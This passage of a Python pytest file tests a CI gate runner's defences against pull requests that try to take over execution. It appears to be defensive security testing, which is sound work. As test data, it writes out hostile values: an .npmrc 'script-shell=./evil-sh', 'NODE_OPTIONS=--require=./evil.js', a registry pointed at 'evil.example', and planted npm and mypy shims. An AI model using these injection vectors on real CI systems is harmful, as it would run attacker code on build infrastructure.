        (releases / "yarn-3.6.0.cjs").write_text("// yarn release\n", encoding="utf-8")
        gates = discover_gates(tmp_path, changed_files=())
        names = {g.name for g in gates}
        assert "npm:format:check" not in names

    def test_npm_gates_skip_when_pr_modifies_npmrc(self, tmp_path: Path) -> None:
        """Iter-38 Finding 1: a PR that adds or modifies ``.npmrc`` can
        introduce ``script-shell`` even if discovery didn't catch the
        config text — fail-closed on any PR diff that touches the file.
        """
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            _make_pkg_json({"format:check": "prettier --check ."}),
            encoding="utf-8",
        )
        # Note: even an empty .npmrc not in the worktree — the PR
        # diff alone makes us assume the runner is poisoned.
        gates = discover_gates(tmp_path, changed_files=(".npmrc",))
        names = {g.name for g in gates}
        assert "npm:format:check" not in names

    def test_npm_gates_skip_when_pr_modifies_yarn_directory(
        self, tmp_path: Path
    ) -> None:
        """Iter-38 Finding 1: yarn 2+ boots from anything under
        ``.yarn/`` (releases, plugins, sdks). A PR diff in that tree
        controls the runtime."""
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            _make_pkg_json({"format:check": "prettier --check ."}),
            encoding="utf-8",
        )
        gates = discover_gates(
            tmp_path,
            changed_files=(".yarn/releases/yarn-3.6.0.cjs",),
        )
        names = {g.name for g in gates}
        assert "npm:format:check" not in names

    def test_direct_tsc_gate_skips_when_npmrc_sets_script_shell(
        self, tmp_path: Path
    ) -> None:
        """Iter-38 Finding 1: the direct ``npx --no-install tsc --noEmit``
        gate is ALSO vulnerable to ``.npmrc`` script-shell redirect —
        npx reads ``.npmrc`` and honours the key. Confirmed against
        npx 10.x."""
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            json.dumps({
                "name": "fake", "version": "0.0.0", "scripts": {},
                "devDependencies": {"typescript": "^5.0.0"},
            }),
            encoding="utf-8",
        )
        (tmp_path / "tsconfig.json").write_text("{}", encoding="utf-8")
        tsc_dir = tmp_path / "node_modules" / "typescript" / "bin"
        tsc_dir.mkdir(parents=True)
        (tsc_dir / "tsc").write_text("#!/usr/bin/env node\n", encoding="utf-8")
        (tmp_path / ".npmrc").write_text(
            "script-shell=./evil-sh\n", encoding="utf-8"
        )
        gates = discover_gates(tmp_path, changed_files=())
        names = {g.name for g in gates}
        assert "tsc-noemit" not in names

    def test_npm_gates_still_emit_on_normal_npmrc_without_script_shell(
        self, tmp_path: Path
    ) -> None:
        """Iter-38 Finding 1 regression bound: a benign ``.npmrc``
        (registry, save-exact, etc.) must NOT disable npm gates.
        The redirect check is precise to the keys that actually
        change script execution."""
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            _make_pkg_json({"format:check": "prettier --check ."}),
            encoding="utf-8",
        )
        (tmp_path / ".npmrc").write_text(
            "registry=https://registry.npmjs.org/\nsave-exact=true\n",
            encoding="utf-8",
        )
        gates = discover_gates(tmp_path, changed_files=())
        names = {g.name for g in gates}
        assert "npm:format:check" in names

    # ------------------------------------------------------------------
    # Iter-38 Finding 2: per-script tsconfig emit-signal walk.
    # ------------------------------------------------------------------

    def test_tsc_script_skipped_when_custom_p_path_signals_emit(
        self, tmp_path: Path
    ) -> None:
        """Iter-38 Finding 2: ``tsc -p config/build.json --noEmit`` whose
        ``config/build.json`` sets ``incremental: true`` writes
        ``tsconfig.tsbuildinfo`` even with ``--noEmit``. The iter-29
        emit-signal walk only checked the worktree-root
        ``tsconfig.json``; iter-38 extends the walk to every ``-p``
        target referenced by a recognised tsc-flavoured script."""
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            json.dumps({
                "name": "fake", "version": "0.0.0",
                "scripts": {"typecheck": "tsc -p config/build.json --noEmit"},
            }),
            encoding="utf-8",
        )
        # Root tsconfig is benign — no incremental — so iter-29's
        # root-only walk would NOT flag this case.
        (tmp_path / "tsconfig.json").write_text(
            '{"compilerOptions": {}}\n', encoding="utf-8"
        )
        (tmp_path / "config").mkdir()
        (tmp_path / "config" / "build.json").write_text(
            '{"compilerOptions": {"incremental": true}}\n',
            encoding="utf-8",
        )
        gates = discover_gates(tmp_path, changed_files=())
        names = {g.name for g in gates}
        assert "npm:typecheck" not in names

    def test_tsc_script_skipped_when_custom_p_extends_chain_signals_emit(
        self, tmp_path: Path
    ) -> None:
        """Iter-38 Finding 2 + iter-29: the per-script walk must also
        traverse the extends chain of the custom ``-p`` target."""
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            json.dumps({
                "name": "fake", "version": "0.0.0",
                "scripts": {"typecheck": "tsc -p config/build.json --noEmit"},
            }),
            encoding="utf-8",
        )
        (tmp_path / "tsconfig.json").write_text(
            '{"compilerOptions": {}}\n', encoding="utf-8"
        )
        (tmp_path / "config").mkdir()
        (tmp_path / "config" / "base.json").write_text(
            '{"compilerOptions": {"composite": true}}\n',
            encoding="utf-8",
        )
        (tmp_path / "config" / "build.json").write_text(
            '{"extends": "./base.json"}\n',
            encoding="utf-8",
        )
        gates = discover_gates(tmp_path, changed_files=())
        names = {g.name for g in gates}
        assert "npm:typecheck" not in names

    def test_tsc_script_skipped_when_custom_p_directory_signals_emit(
        self, tmp_path: Path
    ) -> None:
        """Iter-38 Finding 2: tsc's ``-p <dir>`` resolves to
        ``<dir>/tsconfig.json``. The emit-signal walk must follow the
        directory shape too."""
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            json.dumps({
                "name": "fake", "version": "0.0.0",
                "scripts": {"typecheck": "tsc -p config/build --noEmit"},
            }),
            encoding="utf-8",
        )
        (tmp_path / "tsconfig.json").write_text(
            '{"compilerOptions": {}}\n', encoding="utf-8"
        )
        (tmp_path / "config" / "build").mkdir(parents=True)
        (tmp_path / "config" / "build" / "tsconfig.json").write_text(
            '{"compilerOptions": {"incremental": true}}\n',
            encoding="utf-8",
        )
        gates = discover_gates(tmp_path, changed_files=())
        names = {g.name for g in gates}
        assert "npm:typecheck" not in names

    # ------------------------------------------------------------------
    # Iter-38 Finding 3: pure-package mypy plugin that resolves to a
    # worktree package directory must disable the mypy gate.
    # ------------------------------------------------------------------

    def test_mypy_gate_skipped_when_pure_package_plugin_matches_worktree_package(
        self, tmp_path: Path
    ) -> None:
        """Iter-38 Finding 3: a "pure package" mypy plugin name like
        ``my_project.mypy_plugin`` can still resolve to PR-controlled
        worktree code when the project is installed editable (or
        ``PYTHONPATH=`` points at the worktree). Confirmed against
        mypy 1.20: setting ``PYTHONPATH=.`` (or ``pip install -e .``)
        makes mypy import the worktree module rather than a stable
        site-packages copy. Skip the gate when the plugin's top-level
        name maps to a worktree package directory."""
        import shutil as _shutil
        if not _shutil.which("mypy"):  # pragma: no cover
            return
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "a.py").write_text("x: int = 5\n", encoding="utf-8")
        (tmp_path / "pyproject.toml").write_text(
            '[tool.mypy]\nplugins = ["my_project.mypy_plugin"]\n',
            encoding="utf-8",
        )
        # Worktree contains a top-level ``my_project/`` package that
        # an editable install (or PYTHONPATH=.) would resolve to.
        (tmp_path / "my_project").mkdir()
        (tmp_path / "my_project" / "__init__.py").write_text("", encoding="utf-8")
        (tmp_path / "my_project" / "mypy_plugin.py").write_text(
            "from mypy.plugin import Plugin\nclass P(Plugin): pass\ndef plugin(v): return P\n",
            encoding="utf-8",
        )
        gates = discover_gates(tmp_path, changed_files=("a.py",))
        names = {g.name for g in gates}
        assert "mypy" not in names

    def test_mypy_gate_skipped_when_pure_package_plugin_matches_worktree_module(
        self, tmp_path: Path
    ) -> None:
        """Iter-38 Finding 3: single-file modules (``my_plugin.py`` at
        worktree root) are also editable-importable, so the skip must
        catch ``plugins = ["my_plugin"]`` against ``./my_plugin.py``."""
        import shutil as _shutil
        if not _shutil.which("mypy"):  # pragma: no cover
            return
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "a.py").write_text("x: int = 5\n", encoding="utf-8")
        (tmp_path / "pyproject.toml").write_text(
            '[tool.mypy]\nplugins = ["my_plugin"]\n',
            encoding="utf-8",
        )
        (tmp_path / "my_plugin.py").write_text(
            "from mypy.plugin import Plugin\nclass P(Plugin): pass\ndef plugin(v): return P\n",
            encoding="utf-8",
        )
        gates = discover_gates(tmp_path, changed_files=("a.py",))
        names = {g.name for g in gates}
        assert "mypy" not in names

    def test_mypy_gate_skipped_when_ini_pure_package_plugin_matches_worktree(
        self, tmp_path: Path
    ) -> None:
        """Iter-38 Finding 3 also fires from ``mypy.ini`` / ``.mypy.ini``
        / ``setup.cfg``'s ``[mypy] plugins =`` line."""
        import shutil as _shutil
        if not _shutil.which("mypy"):  # pragma: no cover
            return
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "a.py").write_text("x: int = 5\n", encoding="utf-8")
        # pyproject.toml needs the [tool.mypy] section to even get the
        # mypy gate considered for discovery.
        (tmp_path / "pyproject.toml").write_text(
            "[tool.mypy]\n", encoding="utf-8"
        )
        (tmp_path / "mypy.ini").write_text(
            "[mypy]\nplugins = my_project.mypy_plugin\n",
            encoding="utf-8",
        )
        (tmp_path / "my_project").mkdir()
        (tmp_path / "my_project" / "__init__.py").write_text("", encoding="utf-8")
        gates = discover_gates(tmp_path, changed_files=("a.py",))
        names = {g.name for g in gates}
        assert "mypy" not in names

    def test_mypy_gate_emits_when_pure_package_plugin_has_no_worktree_match(
        self, tmp_path: Path
    ) -> None:
        """Iter-38 Finding 3 regression bound: third-party pure-package
        plugins (``mypy_django_plugin.main``) whose top-level name does
        NOT exist in the worktree still produce a mypy gate. We do not
        want to drop legitimate third-party plugin use."""
        import shutil as _shutil
        if not _shutil.which("mypy"):  # pragma: no cover
            return
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "a.py").write_text("x: int = 5\n", encoding="utf-8")
        (tmp_path / "pyproject.toml").write_text(
            '[tool.mypy]\nplugins = ["mypy_django_plugin.main"]\n',
            encoding="utf-8",
        )
        # No ``mypy_django_plugin/`` directory in the worktree.
        gates = discover_gates(tmp_path, changed_files=("a.py",))
        names = {g.name for g in gates}
        assert "mypy" in names

    def test_build_subprocess_env_strips_pythonpath_family(
        self, monkeypatch: Any
    ) -> None:
        """Iter-38 Finding 3 (primary defence): the runner's env scrub
        MUST strip the Python import-path family so a developer with
        ``PYTHONPATH=.`` in their shell cannot let a "pure package"
        plugin in a stable config resolve to a PR-controlled module
        in the gate's cwd."""
        from pdd.checkup_gates import _build_subprocess_env

        for key, value in (
            ("PYTHONPATH", "/some/path:./more"),
            ("PYTHONHOME", "/opt/python"),
            ("PYTHONSTARTUP", "/some/start.py"),
            ("PYTHONUSERBASE", "/usr/local"),
            ("PYTHONNOUSERSITE", "1"),
        ):
            monkeypatch.setenv(key, value)
        env = _build_subprocess_env()
        for key in (
            "PYTHONPATH",
            "PYTHONHOME",
            "PYTHONSTARTUP",
            "PYTHONUSERBASE",
            "PYTHONNOUSERSITE",
        ):
            assert key not in env, (
                f"_build_subprocess_env must strip {key} so a stale shell "
                f"env cannot escalate a pure-package mypy plugin into a "
                f"worktree import"
            )

    # ------------------------------------------------------------------
    # Iter-39 Finding 3: NPM_CONFIG_*/npm_config_*/NODE_OPTIONS/NODE_PATH
    # are equivalent to .npmrc settings and must be stripped from the
    # gate env. Confirmed against npm 10.x:
    # NPM_CONFIG_SCRIPT_SHELL=./evil-sh executes ./evil-sh on
    # npm run, even on a clean .npmrc.
    # ------------------------------------------------------------------

    def test_build_subprocess_env_strips_npm_config_uppercase(
        self, monkeypatch: Any
    ) -> None:
        """Iter-39 Finding 3: ``NPM_CONFIG_SCRIPT_SHELL`` in the
        operator env redirects ``npm run`` to a PR-controlled binary
        even when ``.npmrc`` is safe. Confirmed against npm 10.x."""
        from pdd.checkup_gates import _build_subprocess_env

        monkeypatch.setenv("NPM_CONFIG_SCRIPT_SHELL", "./evil-sh")
        monkeypatch.setenv("NPM_CONFIG_REGISTRY", "https://evil.example/")
        env = _build_subprocess_env()
        assert "NPM_CONFIG_SCRIPT_SHELL" not in env
        assert "NPM_CONFIG_REGISTRY" not in env

    def test_build_subprocess_env_strips_npm_config_lowercase(
        self, monkeypatch: Any
    ) -> None:
        """Iter-39 Finding 3: npm/pnpm read the lowercase
        ``npm_config_<key>`` form too. Confirmed against npm 10.x:
        ``npm_config_script_shell=./evil-sh`` is an independent env
        key from ``NPM_CONFIG_SCRIPT_SHELL`` and is also honoured."""
        from pdd.checkup_gates import _build_subprocess_env

        monkeypatch.setenv("npm_config_script_shell", "./evil-sh")
        monkeypatch.setenv("npm_config_registry", "https://evil.example/")
        env = _build_subprocess_env()
        assert "npm_config_script_shell" not in env
        assert "npm_config_registry" not in env

    def test_build_subprocess_env_strips_node_options_and_node_path(
        self, monkeypatch: Any
    ) -> None:
        """Iter-39 Finding 3: ``NODE_OPTIONS=--require=./evil.js`` loads
        arbitrary JS into every node subprocess — including the
        ``npx --no-install tsc`` gate. ``NODE_PATH`` is Node's
        ``PYTHONPATH`` analogue and adds directories to Node's
        module-resolution path. Both must be stripped."""
        from pdd.checkup_gates import _build_subprocess_env

        monkeypatch.setenv("NODE_OPTIONS", "--require=./evil.js")
        monkeypatch.setenv("NODE_PATH", "/tmp/evil-modules")
        env = _build_subprocess_env()
        assert "NODE_OPTIONS" not in env
        assert "NODE_PATH" not in env

    def test_build_subprocess_env_forces_corepack_auto_pin_off(
        self, monkeypatch: Any
    ) -> None:
        """Iter-39 Finding 1: Corepack-managed yarn/pnpm auto-pin a
        ``packageManager`` field into ``package.json`` on first run
        (default behaviour). The gate's cwd is the loop-owned PR
        worktree, so the mutation lands in the PR and the downstream
        commit/push helper stages it. The runner MUST set
        ``COREPACK_ENABLE_AUTO_PIN=0`` to prevent this.

        Confirmed against corepack 0.31 + pnpm@latest:
        ``COREPACK_ENABLE_AUTO_PIN=1 corepack pnpm@latest run …``
        mutates ``package.json`` while
        ``COREPACK_ENABLE_AUTO_PIN=0 corepack pnpm@latest run …`` does
        not.
        """
        from pdd.checkup_gates import _build_subprocess_env

        # Even if the operator's env explicitly enables auto-pin, the
        # runner must force the disable.
        monkeypatch.setenv("COREPACK_ENABLE_AUTO_PIN", "1")
        env = _build_subprocess_env()
        assert env.get("COREPACK_ENABLE_AUTO_PIN") == "0"

    # ------------------------------------------------------------------
    # Iter-39 Finding 2: mypy "pure package" plugin resolution under the
    # src/ layout. The iter-38 fix only checked the worktree root; src/
    # layout repos (very common with modern pyproject.toml) put the
    # importable package at worktree/src/<top_level>/.
    # ------------------------------------------------------------------

    def test_mypy_gate_skipped_when_pure_package_plugin_matches_src_layout(
        self, tmp_path: Path
    ) -> None:
        """Iter-39 Finding 2: ``plugins = ["evil_plugin"]`` plus a
        src-layout package at ``src/evil_plugin/__init__.py`` still
        resolves to PR-controlled code under an editable install. The
        iter-38 root-only worktree check missed this — extend the
        check to ``worktree/src/<top_level>``."""
        import shutil as _shutil
        if not _shutil.which("mypy"):  # pragma: no cover
            return
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "a.py").write_text("x: int = 5\n", encoding="utf-8")
        (tmp_path / "pyproject.toml").write_text(
            '[tool.mypy]\nplugins = ["evil_plugin"]\n',
            encoding="utf-8",
        )
        # src/ layout: the package lives under src/, not at root.
        src_pkg = tmp_path / "src" / "evil_plugin"
        src_pkg.mkdir(parents=True)
        (src_pkg / "__init__.py").write_text(
            "from mypy.plugin import Plugin\nclass P(Plugin): pass\ndef plugin(v): return P\n",
            encoding="utf-8",
        )
        gates = discover_gates(tmp_path, changed_files=("a.py",))
        names = {g.name for g in gates}
        assert "mypy" not in names

    def test_mypy_gate_skipped_when_dotted_plugin_matches_src_top_level(
        self, tmp_path: Path
    ) -> None:
        """Iter-39 Finding 2: dotted plugin name (``evil_plugin.main``)
        whose top-level (``evil_plugin``) sits under src/ still
        resolves under an editable install."""
        import shutil as _shutil
        if not _shutil.which("mypy"):  # pragma: no cover
            return
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "a.py").write_text("x: int = 5\n", encoding="utf-8")
        (tmp_path / "pyproject.toml").write_text(
            '[tool.mypy]\nplugins = ["evil_plugin.main"]\n',
            encoding="utf-8",
        )
        src_pkg = tmp_path / "src" / "evil_plugin"
        src_pkg.mkdir(parents=True)
        (src_pkg / "__init__.py").write_text("", encoding="utf-8")
        gates = discover_gates(tmp_path, changed_files=("a.py",))
        names = {g.name for g in gates}
        assert "mypy" not in names

    def test_mypy_gate_skipped_when_src_namespace_dir_matches_plugin(
        self, tmp_path: Path
    ) -> None:
        """Iter-39 Finding 2 + PEP 420: a ``src/evil_plugin/`` directory
        with NO ``__init__.py`` is still importable under namespace-
        package discovery. Conservative treatment: same-named
        directory under src/ disables the gate."""
        import shutil as _shutil
        if not _shutil.which("mypy"):  # pragma: no cover
            return
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "a.py").write_text("x: int = 5\n", encoding="utf-8")
        (tmp_path / "pyproject.toml").write_text(
            '[tool.mypy]\nplugins = ["evil_plugin"]\n',
            encoding="utf-8",
        )
        # PEP 420 namespace-package directory at src/ level — no
        # __init__.py but the directory exists.
        (tmp_path / "src" / "evil_plugin").mkdir(parents=True)
        gates = discover_gates(tmp_path, changed_files=("a.py",))
        names = {g.name for g in gates}
        assert "mypy" not in names

    def test_mypy_gate_emits_when_pure_package_plugin_matches_neither_root_nor_src(
        self, tmp_path: Path
    ) -> None:
        """Iter-39 Finding 2 regression bound: a third-party plugin
        (``mypy_django_plugin.main``) whose top-level appears NEITHER
        at worktree root NOR under ``src/`` must still produce the
        mypy gate. We do not want the broadened check to disable
        legitimate third-party plugin use."""
        import shutil as _shutil
        if not _shutil.which("mypy"):  # pragma: no cover
            return
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "a.py").write_text("x: int = 5\n", encoding="utf-8")
        (tmp_path / "pyproject.toml").write_text(
            '[tool.mypy]\nplugins = ["mypy_django_plugin.main"]\n',
            encoding="utf-8",
        )
        # Worktree has a src/ dir but NO ``src/mypy_django_plugin/``.
        (tmp_path / "src").mkdir()
        (tmp_path / "src" / "unrelated.py").write_text("", encoding="utf-8")
        gates = discover_gates(tmp_path, changed_files=("a.py",))
        names = {g.name for g in gates}
        assert "mypy" in names

    # ------------------------------------------------------------------
    # Iter-40 Finding 1: gate.cmd stores absolute paths; PATH is
    # sanitized to drop ``.``, relative entries, and worktree entries.
    # ------------------------------------------------------------------

    def test_mypy_gate_cmd_uses_absolute_path_not_bare_name(
        self, tmp_path: Path
    ) -> None:
        """Iter-40 Finding 1: an operator with ``PATH=.:$PATH`` (or any
        PATH entry resolving inside the worktree) would otherwise let
        a PR-shipped ``./mypy`` shim become the gate binary. Gate.cmd
        MUST store the absolute path resolved against a sanitized
        PATH so ``subprocess.run`` cannot re-consult PATH at execution
        time."""
        import shutil as _shutil
        if not _shutil.which("mypy"):  # pragma: no cover
            return
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "a.py").write_text("x: int = 5\n", encoding="utf-8")
        (tmp_path / "pyproject.toml").write_text("[tool.mypy]\n", encoding="utf-8")
        # Plant a fake ``./mypy`` at the worktree root.
        (tmp_path / "mypy").write_text("#!/bin/sh\nexit 0\n", encoding="utf-8")
        (tmp_path / "mypy").chmod(0o755)
        gates = discover_gates(tmp_path, changed_files=("a.py",))
        mypy_gates = [g for g in gates if g.name == "mypy"]
        if not mypy_gates:
            return  # mypy not present, skip
        gate = mypy_gates[0]
        assert Path(gate.cmd[0]).is_absolute(), (
            f"gate.cmd[0] must be an absolute path; got {gate.cmd[0]!r}"
        )
        # The absolute path MUST NOT resolve to the PR-planted shim.
        resolved = Path(gate.cmd[0]).resolve()
        try:
            resolved.relative_to(tmp_path.resolve())
        except ValueError:
            pass  # not in worktree — good
        else:
            raise AssertionError(
                f"gate.cmd[0] resolved inside the worktree ({resolved}); "
                f"PATH sanitization failed"
            )

    def test_npm_gate_cmd_uses_absolute_runner_path(
        self, tmp_path: Path
    ) -> None:
        """Iter-40 Finding 1: same as the mypy case but for the
        npm-family runner."""
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            _make_pkg_json({"format:check": "prettier --check ."}),
            encoding="utf-8",
        )
        # PR-shipped ``./npm`` shim
        (tmp_path / "npm").write_text("#!/bin/sh\nexit 0\n", encoding="utf-8")
        (tmp_path / "npm").chmod(0o755)
        gates = discover_gates(tmp_path, changed_files=())
        npm_gates = [g for g in gates if g.name == "npm:format:check"]
        if not npm_gates:
            return
        gate = npm_gates[0]
        assert Path(gate.cmd[0]).is_absolute()
        resolved = Path(gate.cmd[0]).resolve()
        try:
            resolved.relative_to(tmp_path.resolve())
        except ValueError:
            pass
        else:
            raise AssertionError(
                f"npm runner resolved inside the worktree ({resolved})"
            )

    def test_sanitized_path_strips_dot_and_relative_and_worktree_entries(
        self, tmp_path: Path, monkeypatch: Any
    ) -> None:
        """Iter-40 Finding 1: ``_sanitized_path`` removes any PATH
        entry that resolves inside the worktree, plus ``.`` and any
        non-absolute entry."""
        from pdd.checkup_gates import _sanitized_path

        # Build a malicious PATH that mixes safe entries with risky ones.
        risky_subdir = tmp_path / "bin"
        risky_subdir.mkdir()
        path_entries = [
            "/usr/bin",          # safe absolute
            ".",                 # cwd — risky
            "",                  # empty — equivalent to cwd
            "relative/path",     # relative — risky
            str(risky_subdir),   # inside worktree — risky
            "/usr/local/bin",    # safe absolute
        ]
        monkeypatch.setenv("PATH", os.pathsep.join(path_entries))
        sanitized = _sanitized_path(tmp_path)
        clean = sanitized.split(os.pathsep)
        assert "/usr/bin" in clean
        assert "/usr/local/bin" in clean
        assert "." not in clean
        assert "" not in clean
        assert "relative/path" not in clean
        assert str(risky_subdir) not in clean

    def test_build_subprocess_env_sets_sanitized_path(
        self, tmp_path: Path, monkeypatch: Any
    ) -> None:
        """Iter-40 Finding 1: the gate runner env MUST use the
        sanitized PATH so node/npm sub-subprocesses (which spawn
        nested tools like prettier via PATH) cannot pick up a PR-
        shipped shim either."""
        from pdd.checkup_gates import _build_subprocess_env

        risky_bin = tmp_path / "shim"
        risky_bin.mkdir()
        monkeypatch.setenv(
            "PATH",
            os.pathsep.join([".", str(risky_bin), "/usr/bin"]),
        )
        env = _build_subprocess_env(tmp_path)
        clean = env["PATH"].split(os.pathsep)
        assert "/usr/bin" in clean
        assert "." not in clean
        assert str(risky_bin) not in clean

    # ------------------------------------------------------------------
    # Iter-40 Finding 2: PR-modified package.json can change
    # ``packageManager`` and corepack downloads/runs the PR-selected
    # version. Skip all npm-family gates on any package.json change.
    # ------------------------------------------------------------------

    def test_npm_gates_skip_when_pr_modifies_package_json(
        self, tmp_path: Path
    ) -> None:
        """Iter-40 Finding 2: ``packageManager: pnpm@X.Y.Z+sha512:EVIL``
        in PR-modified ``package.json`` makes corepack fetch and run
        the PR-selected version on first invocation. The gate cannot
        statically validate the version pin, so fail closed on any
        PR diff touching ``package.json``."""
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            _make_pkg_json({"format:check": "prettier --check ."}),
            encoding="utf-8",
        )
        # Discovery normally emits npm:format:check — but the PR diff
        # touches package.json, so we must skip.
        gates = discover_gates(tmp_path, changed_files=("package.json",))
        names = {g.name for g in gates}
        assert "npm:format:check" not in names

    def test_npm_gates_skip_when_nested_package_json_pr_modified(
        self, tmp_path: Path
    ) -> None:
        """Iter-40 Finding 2: monorepo workspaces have nested
        ``packages/foo/package.json`` files that can also pin
        packageManager. The skip uses an endswith check to cover both
        root and nested paths."""
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            _make_pkg_json({"format:check": "prettier --check ."}),
            encoding="utf-8",
        )
        gates = discover_gates(
            tmp_path, changed_files=("packages/foo/package.json",)
        )
        names = {g.name for g in gates}
        assert "npm:format:check" not in names

    def test_npm_gates_still_emit_when_package_json_unchanged(
        self, tmp_path: Path
    ) -> None:
        """Iter-40 Finding 2 regression bound: a PR that changes
        unrelated files (no ``package.json``) must still emit the
        gate. We do not want to disable npm gates on every PR."""
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            _make_pkg_json({"format:check": "prettier --check ."}),
            encoding="utf-8",
        )
        gates = discover_gates(tmp_path, changed_files=("src/foo.ts",))
        names = {g.name for g in gates}
        assert "npm:format:check" in names


class TestRunGates:
    """``run_gates`` executes each discovered gate and persists artifacts."""

    def test_records_exit_code_and_persists_artifact(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import Gate, run_gates

        gates = [
            Gate(
                name="echo-ok",
                cmd=[sys.executable, "-c", "import sys; sys.exit(0)"],
                source="<test>",
            )
        ]
        artifacts_dir = tmp_path / "artifacts"
        results = run_gates(
            tmp_path, gates, artifacts_dir=artifacts_dir, round_number=1, mode="review"
        )
        assert len(results) == 1
        assert results[0].exit_code == 0
        manifest = artifacts_dir / "round-1-review-gates.json"
        assert manifest.exists()
        payload = json.loads(manifest.read_text(encoding="utf-8"))
        assert payload[0]["exit_code"] == 0
        assert payload[0]["gate"]["name"] == "echo-ok"
        per_gate = artifacts_dir / "round-1-review-gate-echo-ok.txt"
        assert per_gate.exists()

    def test_failure_exit_code_recorded(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import Gate, run_gates

        gates = [
            Gate(
                name="echo-fail",
                cmd=[sys.executable, "-c", "import sys; sys.exit(7)"],
                source="<test>",
            )
        ]
        artifacts_dir = tmp_path / "artifacts"
        results = run_gates(
            tmp_path, gates, artifacts_dir=artifacts_dir, round_number=1, mode="review"
        )
        assert results[0].exit_code == 7

    def test_truncates_oversize_output(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import Gate, run_gates

        # Emit ~200KB of stdout; the runner truncates to ~10KB.
        script = (
            "import sys; sys.stdout.write('A' * 200000); sys.exit(1)"
        )
        gates = [
            Gate(
                name="bigout",
                cmd=[sys.executable, "-c", script],
                source="<test>",
            )
        ]
        artifacts_dir = tmp_path / "artifacts"
        results = run_gates(
            tmp_path, gates, artifacts_dir=artifacts_dir, round_number=1, mode="review"
        )
        # ~10KB cap, generously bound to allow a small marker like "[truncated]".
        assert len(results[0].stdout_excerpt) <= 12000
        assert results[0].stdout_excerpt  # not empty

    def test_handles_timeout(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import Gate, run_gates

        # Long sleep with a 0.1s timeout: runner must record exit_code=None
        # plus a non-empty error rather than block the loop.
        script = "import time; time.sleep(60)"
        gates = [
            Gate(
                name="hang",
                cmd=[sys.executable, "-c", script],
                source="<test>",
                timeout=0.1,
            )
        ]
        artifacts_dir = tmp_path / "artifacts"
        results = run_gates(
            tmp_path, gates, artifacts_dir=artifacts_dir, round_number=1, mode="review"
        )
        assert results[0].exit_code is None
        lowered = results[0].error.lower()
        assert "timeout" in lowered or "timed out" in lowered

    def test_handles_missing_binary(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import Gate, run_gates

        gates = [
            Gate(
                name="ghost",
                cmd=["this-binary-does-not-exist-xyz-1092"],
                source="<test>",
            )
        ]
        artifacts_dir = tmp_path / "artifacts"
        results = run_gates(
            tmp_path, gates, artifacts_dir=artifacts_dir, round_number=1, mode="review"
        )
        assert results[0].exit_code is None
        assert results[0].error  # non-empty

    def test_scrubs_secrets_in_excerpts(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import Gate, run_gates

        # Use ``Authorization: Bearer …`` which the existing scrubber regex
        # recognises, so the runner must consult the loop's scrubber before
        # persisting the excerpt.
        script = (
            "import sys; "
            "sys.stderr.write('error: Authorization: Bearer sk-abcdefghijklmnopqr\\n'); "
            "sys.exit(1)"
        )
        gates = [
            Gate(
                name="leakage",
                cmd=[sys.executable, "-c", script],
                source="<test>",
            )
        ]
        artifacts_dir = tmp_path / "artifacts"
        results = run_gates(
            tmp_path, gates, artifacts_dir=artifacts_dir, round_number=1, mode="review"
        )
        assert "[REDACTED]" in results[0].stderr_excerpt
        assert "sk-abcdefghijklmnopqr" not in results[0].stderr_excerpt
        assert "sk-abcdefghijklmnopqr" not in results[0].stdout_excerpt

    def test_per_file_gate_name_and_source_scrub_when_path_contains_token(
        self, tmp_path: Path
    ) -> None:
        """Iter-25 Finding 1: a PR can change a Python file whose
        path contains a token-shaped substring (e.g.
        ``pkg/ghp_xxx_abcdefghijklmnopqrst.py``). The per-file gate
        names itself ``py-compile:<rel>`` and sets ``source=<rel>``,
        so without scrubbing the token leaks into:
        - the per-gate artifact FILENAME on disk (filename slug)
        - the per-gate artifact BODY (gate:/source: lines)
        - ReviewFinding.reviewer (``gate:<name>``)
        - ReviewFinding.location (``<source>``)
        - ReviewFinding.finding (the message text)
        All five surfaces must be redacted.
        """
        from pdd.checkup_gates import (
            discover_gates,
            gate_results_to_findings,
            run_gates,
        )

        _git_init(tmp_path)
        pkg = tmp_path / "pkg"
        pkg.mkdir()
        # Token-shaped file name (ghp_ + 20+ alphanumeric chars).
        token_path_part = "ghp_AAAAAAAAAAAAAAAAAAAAAA"
        rel = f"pkg/{token_path_part}.py"
        # Bad syntax so the gate FAILS — that's what routes the
        # name/source through the finding adapter.
        (pkg / f"{token_path_part}.py").write_text(
            "this is not python(\n", encoding="utf-8"
        )
        gates = [g for g in discover_gates(tmp_path, changed_files=(rel,))
                 if g.name.startswith("py-compile:")]
        assert gates, "py-compile gate must be discovered"
